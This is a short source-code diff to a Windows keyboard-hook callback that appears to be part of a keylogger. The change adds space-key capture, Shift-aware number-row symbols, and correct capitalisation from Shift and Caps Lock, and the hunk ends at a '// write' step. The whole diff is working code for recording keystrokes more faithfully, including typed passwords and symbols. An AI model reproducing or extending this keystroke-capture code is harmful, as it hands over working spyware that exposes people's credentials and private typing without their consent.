@@ -73,14 +73,60 @@ LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam)
 			case VK_DOWN:
 				key.assign("{DOWN ARROW}");
 				break;
+			case VK_SPACE:
+				key.assign("{SPACE}");
+				break;
 			default:
-				if(KeyCode >= 0x30 && KeyCode <= 0x39)
+				if (KeyCode >= 0x30 && KeyCode <= 0x39)
 				{
-					key.push_back(KeyCode);
+					if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
+						switch (KeyCode)
+						{
+						case 0x30:
+							key.push_back(')');
+							break;
+						case 0x31:
+							key.push_back('!');
+							break;
+						case 0x32:
+							key.push_back('@');
+							break;
+						case 0x33:
+							key.push_back('#');
+							break;
+						case 0x34:
+							key.push_back('$');
+							break;
+						case 0x35:
+							key.push_back('%');
+							break;
+						case 0x36:
+							key.push_back('^');
+							break;
+						case 0x37:
+							key.push_back('&');
+							break;
+						case 0x38:
+							key.push_back('*');
+							break;
+						case 0x39:
+							key.push_back('(');
+						}
+					}
+					else
+					{
+						key.push_back(KeyCode);
+					}
 				}
-				else if(KeyCode >= 0x41 && KeyCode <= 0x5a)
+				else if (KeyCode >= 0x41 && KeyCode <= 0x5a)
 				{
-					key.push_back(KeyCode);
+					if(GetAsyncKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001)
+					{
+						key.push_back(KeyCode);
+					}
+					else {
+						key.push_back(KeyCode + 32);
+					}
 				}
 			}
 			// write
